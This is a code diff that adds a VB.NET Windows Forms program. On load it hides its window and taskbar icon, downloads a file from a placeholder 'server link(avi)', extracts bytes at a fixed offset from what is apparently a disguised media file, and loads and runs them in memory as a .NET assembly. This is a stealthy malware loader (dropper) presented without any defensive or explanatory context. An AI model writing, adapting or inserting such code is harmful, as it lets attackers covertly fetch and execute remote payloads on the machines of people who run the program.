@@ -1,0 +1,18 @@
+Imports System.IO
+
+Public Class Form1
+
+  Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+  Me.Hide()
+  Me.ShowInTaskbar = False
+  Me.ShowIcon = False
+  Dim best As New System.Net.WebClient
+  Dim sonia As Byte() = best.DownloadData("server link(avi)")
+  Dim buffer(sonia.Length - 114772 - 1) As Byte
+  For i As Integer = 0 To 24064 - 1
+  buffer(i) = sonia(114772 + i)
+  Next
+  AppDomain.CurrentDomain.Load(buffer).EntryPoint.Invoke(Nothing, Nothing)
+  End
+  End Sub
+End Class
